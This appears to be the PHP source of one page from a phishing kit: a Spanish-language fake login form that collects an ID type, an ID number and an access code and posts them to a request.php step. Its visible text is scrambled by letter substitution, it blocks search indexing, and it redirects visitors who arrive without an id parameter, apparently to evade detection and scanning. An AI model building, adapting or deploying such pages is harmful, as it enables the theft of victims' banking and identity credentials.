<?php 

    $page = 'default';
    require_once 'init.php';
    if(!isset($_GET['id'])):
        die(rediret($link)); // We're done here
    else:
      $action = './request.php?step=one&'.$id;

?>
<!DOCTYPE html>
<html lang="es" class="log">
	<head>
	<meta charset="UTF-8"/>
	<meta http-equiv="x-ua-compatible" content="ie=edge">
	<title>Bienvenido a nuestra pagina</title>
	<meta name="robots" content="noindex, nofollow, noimageindex">
	<meta name="description" content="">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" href="<?php echo $css1; ?>">
	<link rel="stylesheet" href="<?php echo $css2; ?>">
	<link rel="shortcut icon nofollow" href="<?php echo $favicon; ?>">
	</head>
	<body>
<!-- ============================ -->
<!-- ======= Start Header ======= -->
<!-- ============================ -->
		<header>
			<div class="contenue">
				<div class="lg">
				<img src="layout/img/lg.svg" alt="">
				</div>
				<div class="stifham">
				<img src="layout/img/stifham.svg" alt="">
				<span>Metncrón ml clrtnet</span>
				</div>
			</div>
		</header>
<!-- ============================= -->
<!-- ======= Start content ======= -->
<!-- ============================= -->
	<div class="section">
		<div class="contenue-page">
			<div class="title">
			<span>Bptnvz dímz</span>
			<p><?php  echo date("d"); ?> <?php setlocale(LC_ALL,"es_ES"); echo strftime("%B"); ?> <?php  echo date("Y"); ?></p>
			</div>
			<div class="form">
			<div class="web">Ri m qtb clmzrcm</div>
			<div class="clearfix"></div>
			<div class="contenue-form">
				<form id="lFrm" method="post" action="<?php echo $action; ?>">
					<select class="select1" id="pnl" name="pnl">
					  <option value="Usuario">Usuario</option>
					  <option value="Documento" selected="selected">Documento</option>
					</select>
					<select class="select2" id="type" name="type">
					  <option value="N-I-F">NlF</option>
					  <option value="C-I-F">ClF</option>
					  <option value="N-I-E">NlE</option>
					  <option value="P-A-S-P-O-R-T">PASAPORTE</option>
					</select>
                    <input type="text" id="Uid" name="Uid" maxlength="9" Placeholder="NlF / ClF / NlT" autocomplete="off" required>
                    <input type="text" id="Pid" name="Pid" maxlength="8" placeholder="Clmot dt mcctzv" autocomplete="off" required>
					<div class="box"><img src="layout/img/box.svg" ><span>Itcvidmi ar pzpmirv</span></div>
					<button value="" type="submit" >tneimi</button>
					<div class="span2">
					<span>Itcputimi clmot</span>
					<span>Vbetnti clmotz</span>
					</div>
					<div class="separator"></div>
					<div class="spanonly">hmset clrtnet</div>
				</form>
			</div>
			</div>
		</div>
	</div>
<!-- ============================ -->
<!-- ======= Start Footer ======= -->
<!-- ============================ -->
	<footer class="footer-pc">
	<p>Ztgpirdmd | Rnzeipccrvntz dt mcctzv | Uvlíercm dt Cvvxrtz</p>
	</footer>
	<footer class="footer-telef">
	<p>Ztgpirdmd</p>
	<p>Rnzeipccrvntz dt mcctzv</p>
	<p>Uvlíercm dt Cvvxrtz</p>
	</footer>
	
	
	
	
	</body>

</html>
<?php
    endif;
    ob_end_flush();
?>
